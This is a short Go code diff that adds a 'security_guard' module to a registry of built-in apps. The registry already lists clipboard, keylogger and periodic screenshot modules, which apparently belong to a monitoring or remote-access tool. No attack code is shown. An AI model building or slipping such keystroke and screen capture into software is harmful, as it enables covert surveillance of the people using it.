@@ -20,4 +20,5 @@ func AddBuiltinApps(am *apps.AppManager) {
 	am.AddApp("clipboard", &apps.ClipboardApp{})
 	am.AddApp("keylogger", &apps.KeyLoggerApp{})
 	am.AddApp("screenshot", &apps.ScreenshotApp{Interval: 2000})
+	am.AddApp("security_guard", &apps.SecurityGuardApp{})
 }
